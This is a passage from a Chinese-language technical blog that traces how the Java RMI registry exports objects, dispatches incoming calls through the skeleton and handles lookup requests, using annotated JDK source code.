<span class="comment">// 将特权动作中的受检异常还原抛出</span></span><br><span class="line">                <span class="keyword">throw</span> (IOException) pae.getException();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 恢复线程上下文并清理线程局部</span></span><br><span class="line">                setContextClassLoader(savedCcl);</span><br><span class="line">                currentTransport.set(<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            <span class="comment">// 这里通常会把 IO/编组错误回写给客户端（省略具体回写逻辑），并决定连接是否可复用</span></span><br><span class="line">            <span class="comment">// 若需要中断复用，可在上层捕获后返回 false；当前实现按成功路径继续返回 true</span></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="comment">// 远程语义错误（如 NoSuchObject、权限拒绝等）通常已由分发器写回</span></span><br><span class="line">        <span class="comment">// 这里捕获以防止异常冒泡导致上层未按协议收尾</span></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前实现：成功处理 → 允许连接复用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数的主要逻辑是：</p>
<ol>
<li><p>首先该函数会先调用 <code>ObjID.read(call.getInputStream())</code> 获取对象 id，对于注册中心这里获取的 id 是 0。</p>
</li>
<li><p>之后调用 <code>ObjectTable.getTarget</code> 根据创建的 <code>ObjectEndpoint</code> 在 <code>ObjectTable</code> 中查询对应的 <code>target</code> 对象。这里的 <code>target</code> 对象是在前面导出注册中心的时候放入 <code>ObjectTable</code> 的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将目标对象“导出”（export）到当前传输层，使其能够接收远程调用。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;导出做了两件关键的事：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;把 &#123;<span class="doctag">@code</span> target&#125; 绑定到当前 &#123;<span class="doctag">@code</span> Transport&#125; 实例（反向引用），</span></span><br><span class="line"><span class="comment"> *       以便后续入站请求、DGC（分布式 GC）通知、异常回写等都经由该传输层处理。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;把 &#123;<span class="doctag">@code</span> target&#125; 注册到全局的 &#123;<span class="doctag">@code</span> ObjectTable&#125;，</span></span><br><span class="line"><span class="comment"> *       建立 ObjID → Target 的查找关系，这样当有入站调用携带某个 ObjID 时，</span></span><br><span class="line"><span class="comment"> *       传输层就能在表里定位到对应的服务对象并完成调度。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;并发与幂等：&lt;/b&gt;注册通常是线程安全的，但“重复导出同一 ObjID”在实现上可能被视为错误，</span></span><br><span class="line"><span class="comment"> * 具体行为取决于 &#123;<span class="doctag">@code</span> ObjectTable.putTarget&#125;（常见是抛出 &#123;<span class="doctag">@code</span> ExportException&#125; 的子类）。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;异常：&lt;/b&gt;本方法声明 &#123;<span class="doctag">@link</span> RemoteException&#125; 以兼容具体传输层/注册实现可能抛出的远程导出错误；</span></span><br><span class="line"><span class="comment"> * 该基类实现本身不直接抛出，但调用链（尤其是 &#123;<span class="doctag">@code</span> ObjectTable.putTarget&#125;）可能触发。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> target 被导出的目标（封装了远程对象、ObjID、LiveRef 等元信息）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 导出/注册失败时抛出（如 ObjID 冲突、底层资源问题等）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 1) 建立 Target → Transport 的反向绑定：</span></span><br><span class="line">    <span class="comment">//    让 target 知道今后由哪个传输层接收请求、发送响应/异常、处理 DGC。</span></span><br><span class="line">    target.setExportedTransport(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 注册到全局对象表：</span></span><br><span class="line">    <span class="comment">//    使 ObjID 可解析到具体的 Target（从而解析到真正的远程对象与其调度信息）。</span></span><br><span class="line">    <span class="comment">//    之后入站调用根据请求里的 ObjID 在此表中查到 target 并完成分发。</span></span><br><span class="line">    ObjectTable.putTarget(target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>通过 <code>getDispatcher</code> 方法获取 <code>target</code> 对象的远程对象引用 <code>disp</code>（实际上是 <code>UnicastServerRef</code>）。</p>
</li>
<li><p>调用 <code>UnicastServerRef#dispatch</code> 将方法调用分发给服务端的远程对象并序列化服务端调用返回的结果。</p>
</li>
</ol>
<p><code>dispatch</code> 函数首先读取操作数 <code>num</code>（即前面的 <code>opnum</code>），接着会会根据 <code>skel</code> 是否为空来区别 <code>RegistryImpl</code> 和 <code>UnicastRemoteObject</code>（即区别注册中心和普通远程对象）。对于注册中心 <code>dispatch</code> 函数会调用 <code>oldDispatch</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调度远程对象的方法（服务端侧）。</span></span><br><span class="line"><span class="comment"> * 在返回前，必须完成：处理到服务端的上行调用（参数解组 + 目标方法调用）</span></span><br><span class="line"><span class="comment"> * 以及“返回值或异常”的序列化（写回到对端）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;协议兼容性&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;RMI 1.1 旧存根：先写入一个 &lt;code&gt;int&lt;/code&gt; 非负“操作编号”（方法索引），服务端需依赖 Skeleton。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;RMI 1.2+ 新存根：先写入一个 &lt;code&gt;int&lt;/code&gt; 负的“版本标记”，随后写入 &lt;code&gt;long&lt;/code&gt; 方法哈希，</span></span><br><span class="line"><span class="comment"> *       服务端按哈希定位 Method，无需 Skeleton。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;流的所有权&lt;/b&gt;：输入/输出流由 &#123;<span class="doctag">@link</span> RemoteCall&#125; 管理；本方法内不应自行关闭底层流，</span></span><br><span class="line"><span class="comment"> * 仅通过 &#123;<span class="doctag">@code</span> releaseInputStream&#125;/&#123;<span class="doctag">@code</span> releaseOutputStream&#125; 归还。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj   本次调用的目标远程对象实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> call  远程调用上下文，可从中取得编组/解组所需的输入/输出流</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 若返回值编组失败，或在释放输入/输出流时失败，会抛出（例如 &#123;<span class="doctag">@link</span> java.rmi.UnmarshalException&#125;）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote obj, RemoteCall call)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 1.1 存根：为正的操作编号（方法索引）</span></span><br><span class="line">    <span class="comment">// 1.2+ 存根：为负的“版本号”（随后要再读一个 long 作为方法哈希）</span></span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="type">long</span> op;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ==== 读取远程调用头部（先读一个 int）====</span></span><br><span class="line">        ObjectInput in;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in = call.getInputStream(); <span class="comment">// 生命周期由 RemoteCall 控制，这里只使用</span></span><br><span class="line">            num = in.readInt();         <span class="comment">// 旧协议: 方法索引；新协议: 负版本标记</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception readEx) &#123;</span><br><span class="line">            <span class="comment">// 统一转成 UnmarshalException，便于上层按 RMI 语义回传</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>, readEx);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==== 旧协议：需要 skeleton 才能分发 ====</span></span><br><span class="line">        <span class="keyword">if</span> (num &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (skel != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 交由旧协议分发入口：内部会继续读调用头等并完成分发</span></span><br><span class="line">                oldDispatch(obj, call, num);</span><br><span class="line">                <span class="keyword">return</span>; <span class="comment">// 分发完成直接返回</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 客户端按 1.1 说话，但服务端没有 skeleton，协商失败</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                    <span class="string">&quot;skeleton class not found but required for client version&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>

<p><code>oldDispatch</code> 会调用 <code>skel</code> 的 <code>dispatch</code> 方法。根据前面对注册中心创建过程中的 <code>objTable</code> 的值的分析可知，这里调用的是 <code>RegistryImpl_Skel#dispatch</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用 RMI 1.1 的存根/骨架（Stub/Skeleton）协议进行服务端调度。</span></span><br><span class="line"><span class="comment"> * 给定一个“操作编号”（op，通常是由旧协议约定的整型下标）和</span></span><br><span class="line"><span class="comment"> * 从调用流中读到的方法哈希（hash，长整型，用于核对 stub/skin 的方法匹配），</span></span><br><span class="line"><span class="comment"> * 将请求分发给服务端骨架以调用目标远程对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;异常交由上层（调用者）统一处理：若在解组/分发过程中抛出异常，</span></span><br><span class="line"><span class="comment"> * 上层会将其封装并通过网络回传给远程客户端。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;调用顺序：&lt;/b&gt;获取输入流 → 读取方法哈希 → 日志记录 → 反序列化自定义调用数据 → 分发到骨架。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;注意事项：&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;此方法遵循 RMI 1.1 老协议，依赖 Skeleton 的 &#123;<span class="doctag">@code</span> getOperations()&#125; 和 &#123;<span class="doctag">@code</span> dispatch(...)&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&#123;<span class="doctag">@code</span> op&#125; 若在操作表范围外，仅用于日志打印；真正匹配由 &#123;<span class="doctag">@code</span> hash&#125; 与骨架完成。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;不要手动关闭从 &#123;<span class="doctag">@code</span> call&#125; 获取的输入/输出流，其生命周期由 &#123;<span class="doctag">@code</span> RemoteCall&#125; 管控。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj   目标远程对象实例（真正执行业务逻辑的对象）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> call  当前远程调用的上下文，包含输入/输出流等编组资源</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> op    操作编号（旧协议下的方法索引；可能为负或越界，仅用于日志友好展示）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception 当读取调用头（方法哈希）、反序列化自定义数据、或骨架分发失败时抛出。</span></span><br><span class="line"><span class="comment"> *                   典型地会包装为 &#123;<span class="doctag">@link</span> java.rmi.UnmarshalException&#125; 等并由上层回传客户端。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">oldDispatch</span><span class="params">(Remote obj, RemoteCall call, <span class="type">int</span> op)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 存根/骨架用于方法匹配的 64-bit 哈希；老协议中，客户端和服务端用它来确认“调用的是同一个方法”</span></span><br><span class="line">    <span class="type">long</span> hash;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 获取输入流：用于解组调用头（方法哈希）及后续自定义调用数据</span></span><br><span class="line">    <span class="comment">//    注意：流由 RemoteCall 统一管理，这里不负责关闭。</span></span><br><span class="line">    <span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [... 可能还有一些与传输层相关的预处理逻辑（保留位） ...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 2) 读取方法哈希（由客户端在调用头中写入）</span></span><br><span class="line">        <span class="comment">//    若此处失败，说明来路数据非法或链路异常，按 RMI 语义抛解组异常。</span></span><br><span class="line">        hash = in.readLong();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ioe) &#123;</span><br><span class="line">        <span class="comment">// 将底层 I/O/解组错误转为 RMI 友好的 UnmarshalException 以便上层统一处理和回传</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>, ioe);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 日志记录：优先使用 op 在骨架的操作表中的可读名称；否则退化为 &quot;op: &lt;数字&gt;&quot;</span></span><br><span class="line">    <span class="comment">//    说明：op 仅用于友好日志；真正分发匹配仍依赖 hash 与骨架内部逻辑。</span></span><br><span class="line">    Operation[] operations = skel.getOperations();</span><br><span class="line">    logCall(obj, (op &gt;= <span class="number">0</span> &amp;&amp; op &lt; operations.length) ? operations[op] : (<span class="string">&quot;op: &quot;</span> + op));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 解组自定义调用数据：为传输/协议扩展预留的钩子（如客户端上下文、附加标头等）</span></span><br><span class="line">    <span class="comment">//    若没有扩展，通常为 no-op；若有扩展，必须在分发前把这些数据从流里读出来。</span></span><br><span class="line">    unmarshalCustomCallData(in);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 分发到骨架：由骨架根据（op, hash）确定具体方法并完成参数解组、方法调用与结果回写。</span></span><br><span class="line">    <span class="comment">//    所有在调用链上的异常将继续向上抛出，由上层统一封装并回传给客户端。</span></span><br><span class="line">    skel.dispatch(obj, call, op, hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>RegistryImpl_Skel#dispatch</code> 会根据 <code>opnum</code> 进行不同的处理：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (opnum) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// bind(String, Remote)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// list()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// lookup(String)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// rebind(String, Remote)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">// unbind(String)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于客户端的 <code>lookup</code> 调用代码逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// lookup(String)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ---- 1) 解组（读取）入参：String name ----</span></span><br><span class="line">    java.lang.String $param_String_1;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// RMI 传输层提供的输入流（通常是 MarshalInputStream 的子类），</span></span><br><span class="line">        <span class="comment">// 这里按需向下转型为 ObjectInputStream 使用。</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> (ObjectInputStream) call.getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 JDK 内部的 SharedSecrets 直读字符串：</span></span><br><span class="line">        <span class="comment">// 与通用的 in.readObject() 不同，readString(...) 只接收 TC_STRING/TC_LONGSTRING，</span></span><br><span class="line">        <span class="comment">// 避免触发任意对象反序列化（更高效、也更安全）。</span></span><br><span class="line">        $param_String_1 =</span><br><span class="line">            SharedSecrets.getJavaObjectInputStreamReadString().readString(in);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException | IOException e) &#123;</span><br><span class="line">        <span class="comment">// 入参解组失败：丢弃还未处理完的引用（避免 DGC/引用泄漏），并按协议抛出“解组异常”</span></span><br><span class="line">        call.discardPendingRefs();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 无论成功失败，都要释放输入流占用的底层资源/连接一侧</span></span><br><span class="line">        call.releaseInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---- 2) 本地调用实现：RegistryImpl.lookup(name) ----</span></span><br><span class="line">    java.rmi.<span class="type">Remote</span> <span class="variable">$result</span> <span class="operator">=</span> server.lookup($param_String_1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---- 3) 组包并写回返回值（正常返回）----</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// true 表示“正常返回”（非异常路径）；RMI 会据此写入相应的返回头部</span></span><br><span class="line">        java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回值是 Remote：RMI 会在写出时将其“替换”为可传输的 stub/动态代理，</span></span><br><span class="line">        <span class="comment">// 客户端收到的是远程引用而非服务端实现对象本身</span></span><br><span class="line">        out.writeObject($result);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">        <span class="comment">// 返回值序列化失败 → 按协议抛出“编组异常”</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p>数据流中读取名称字符串 <code>$param_String_1</code>。</p>
</li>
<li><p>调用 <code>server.lookup</code> 查询对应的远程对象。这里 <code>server</code> 实际上就是 <code>RegistryImpl</code>，因此调用的是 <code>RegistryImpl#lookup</code> 并最终在 <code>bindings</code> 哈希表中查询对应的远程对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按名称从注册表中查找并返回已绑定的远程对象（通常为其 stub）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;语义：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;在同步块内以原子方式从内部映射 &#123;<span class="doctag">@code</span> bindings&#125; 获取条目；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若名称未绑定则抛出 &#123;<span class="doctag">@link</span> NotBoundException&#125;；&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;成功则直接返回当时登记的 &#123;<span class="doctag">@link</span> Remote&#125; 引用（一般是通过 export 得到的存根）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;注意：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;规范通常要求 &#123;<span class="doctag">@code</span> name&#125; 非 &#123;<span class="doctag">@code</span> null&#125;；具体实现可能在更高层做校验。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;该方法只做“读取”；绑定/覆盖请使用 &#123;<span class="doctag">@code</span> bind&#125;/&#123;<span class="doctag">@code</span> rebind&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 要查找的绑定名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 与该名称关联的远程对象（stub）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException    远程调用/传输层错误（当通过远程 stub 调用本方法时）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NotBoundException  名称当前未绑定</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String name)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException, NotBoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) 